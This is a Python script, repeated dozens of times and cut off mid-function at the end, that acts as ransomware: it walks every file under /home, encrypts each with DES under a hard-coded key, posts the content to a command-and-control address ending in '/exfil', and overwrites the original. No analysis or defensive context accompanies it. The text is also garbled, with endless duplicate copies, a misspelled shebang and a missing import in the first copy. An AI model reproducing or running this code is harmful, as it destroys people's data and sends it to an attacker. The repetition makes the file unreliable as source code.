from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
